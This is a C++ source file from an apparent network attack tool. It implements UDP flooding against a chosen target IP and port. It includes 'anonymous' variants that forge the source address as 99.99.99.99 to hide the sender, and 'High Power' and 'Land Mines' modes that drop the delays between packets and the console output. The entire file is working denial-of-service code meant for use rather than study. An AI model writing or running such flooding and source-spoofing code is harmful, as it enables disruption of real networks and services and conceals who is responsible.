#include "../net/conn.h"
#include "../net/uplink.h"
#include "../net/smake.h"
#include "../util/data.h"
#include <unistd.h>
#include <random>
#include <ctime>

using namespace std;

namespace incision {

	inline void seedRandom() { srand(time(nullptr)); } // doesn't need to be cryptographically secure, I don't think
	inline int randomPort() { return rand() % 65536; }
	inline int randomCommonPort() { return (rand() % 64512) + 1024; } // at least 1024

	data::Bytes defaultPayload = {0x6C, 0x6F, 0x76, 0x65, 0x68, 0x61, 0x73, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x61, 0x77, 0x61, 0x79}; // lovehasfoundaway

	class Attack {

		protected:

			string target;
			data::Bytes payload;

		public:

			Attack() {}

			virtual inline string getName() = 0;
			virtual inline void atk() = 0; 
			void attack(long long count, bool lm=false, bool hp=false) {
				if (lm) {
					hideCursor();
					if (hp) {
						for (int i = 0; i < count; i++) {
							atk();
						}
					} else {
						for (int i = 0; i < count; i++) {
							atk();
							usleep(10);
						}
					}
					showCursor();
					return;
				} else {
					cout << "Beginning " << getName() << " attack. Information:" << endl;
					cout << "  Target information" << endl;
					cout << "    Target: " << target << endl;
					cout << "  Payload information" << endl;
					cout << "    Strike count: " << count << endl;
					cout << "    Payload length: " << payload.getLength() << " bytes" << endl;
					cout << "    Total deployed payload: " << (count * payload.getLength()) << " bytes" << endl;
					cout << "  Configuration details" << endl;
					cout << "    Low Moderation Mode (Land Mines): ";
					if (lm) {
						cout << colors::colorize("ENABLED", colors::OKGREEN) << endl;
					} else {
						cout << colors::colorize("DISABLED", colors::FAIL) << endl;
					}
					cout << "    High Power Mode (Hollow Points): ";
					if (hp) {
						cout << colors::colorize("ENABLED", colors::OKGREEN) << endl;
					} else {
						cout << colors::colorize("DISABLED", colors::FAIL) << endl;
					}
					cout << "    Systems: " << colors::colorize("ARMED", colors::OKGREEN) << endl;
					if (notif::confirm()) {
						hideCursor();
						if (hp) {
							for (int i = 0; i < count; i++) {
								atk();
								cout << "Strike launched: " << i + 1 << " of " << count << ", " << (count - i - 1) << " remaining                                         \r";
							}
						} else {
							for (int i = 0; i < count; i++) {
								atk();
								usleep(10);
								cout << "Strike launched: " << i + 1 << " of " << count << ", " << (count - i - 1) << " remaining                                         \r";
							}
						}
						showCursor();
					}
				}
			}

	};

	class DirectUDPFlood: public Attack {

		private:

			conn::UDPConnection udpc;
			string target;
			data::Bytes payload;

		public:

			DirectUDPFlood(string tgt, int prt, data::Bytes pl = defaultPayload) {
				target = tgt;
				udpc = conn::UDPConnection(target, prt);
				payload = pl; 
				udpc.establish(); 
			}

			inline string getName() override { return "UDP Flood"; }
			inline void atk() override { udpc.transmit(payload); }

	};

	class AnonymousUDPFlood: public Attack {

		private:

			uplink::IPv4Uplink upl;
			pktd::Packet pkt;
			string target;
			data::Bytes payload;

		public:
		
			AnonymousUDPFlood(string target, int port=9999, data::Bytes payload=defaultPayload): target(target), payload(payload), pkt(smake::smakeUDP("99.99.99.99", target, port, port, payload)) {}

			inline string getName() override { return "Anonymous UDP Flood"; }
			inline void atk() override { upl.transmit(pkt); }

	};

	namespace raw {

		void udpbomb(string target, int port, long long count, data::Bytes payload=defaultPayload, bool lm=false, bool hp=false) {
			conn::UDPConnection udpc(target, port);
			udpc.establish();
			if (lm) {
				if (hp) {
					for (int i = 0; i < count; i++) {
						udpc.transmit(payload);
					}
				} else {
					for (int i = 0; i < count; i++) {
						udpc.transmit(payload);
						usleep(100);
					}
				}
				return;
			} else {
				cout << "Beginning UDP bombing. Information:" << endl;
				cout << "  Target information" << endl;
				cout << "    Target IP: " << target << endl;
				cout << "    Target port: " << port << endl;
				cout << "  Payload information" << endl;
				cout << "    UDP packet count: " << count << " packets" << endl;
				cout << "    Payload length: " << payload.getLength() << " bytes" << endl;
				cout << "    Total deployed payload: " << (count * payload.getLength()) << " bytes" << endl;
				cout << "  Configuration details" << endl;
				cout << "    Low Moderation Mode (Land Mines): ";
				if (lm) {
					cout << colors::colorize("ENABLED", colors::OKGREEN) << endl;
				} else {
					cout << colors::colorize("DISABLED", colors::FAIL) << endl;
				}
				cout << "    High Power Mode (Hollow Points): ";
				if (hp) {
					cout << colors::colorize("ENABLED", colors::OKGREEN) << endl;
				} else {
					cout << colors::colorize("DISABLED", colors::FAIL) << endl;
				}
				cout << "    UDP port: " << colors::colorize("ARMED", colors::OKGREEN) << endl;
				if (notif::confirm()) {
					if (hp) {
						for (int i = 0; i < count; i++) {
							udpc.transmit(payload);
							cout << "Packet deployed: " << i << " of " << count << ", " << (count - i) << " remaining                                         \r";
						}
					} else {
						for (int i = 0; i < count; i++) {
							udpc.transmit(payload);
							usleep(100);
							cout << "Packet deployed: " << i << " of " << count << ", " << (count - i) << " remaining                                         \r";
						}
					}
				}
			}
		}

		void udpbombanon(string target, int port, long long count, data::Bytes payload=defaultPayload, bool lm=false, bool hp=false) {
			uplink::IPv4Uplink upl;
			pktd::Packet pkt = smake::smakeUDP("99.99.99.99", target, 99999, 99999, payload);
			if (lm) {
				if (hp) {
					for (int i = 0; i < count; i++) {
						upl.transmit(pkt);
					}
				} else {
					for (int i = 0; i < count; i++) {
						upl.transmit(pkt);
						usleep(100);
					}
				}
				return;
			} else {
				cout << "Beginning UDP bombing. Information:" << endl;
				cout << "  Target information" << endl;
				cout << "    Target IP: " << target << endl;
				cout << "    Target port: " << port << endl;
				cout << "  Payload information" << endl;
				cout << "    UDP packet count: " << count << " packets" << endl;
				cout << "    Payload length: " << payload.getLength() << " bytes" << endl;
				cout << "    Total deployed payload: " << (count * payload.getLength()) << " bytes" << endl;
				cout << "  Configuration details" << endl;
				cout << "    Low Moderation Mode (Land Mines): ";
				if (lm) {
					cout << colors::colorize("ENABLED", colors::OKGREEN) << endl;
				} else {
					cout << colors::colorize("DISABLED", colors::FAIL) << endl;
				}
				cout << "    High Power Mode (Hollow Points): ";
				if (hp) {
					cout << colors::colorize("ENABLED", colors::OKGREEN) << endl;
				} else {
					cout << colors::colorize("DISABLED", colors::FAIL) << endl;
				}
				cout << "    UDP port: " << colors::colorize("ARMED", colors::OKGREEN) << endl;
				if (notif::confirm()) {
					if (hp) {
						for (int i = 0; i < count; i++) {
							upl.transmit(pkt);
							cout << "Packet deployed: " << i << " of " << count << ", " << (count - i) << " remaining                                         \r";
						}
					} else {
						for (int i = 0; i < count; i++) {
							upl.transmit(pkt);
							usleep(100);
							cout << "Packet deployed: " << i << " of " << count << ", " << (count - i) << " remaining                                         \r";
						}
					}
				}
			}
		}

	};

};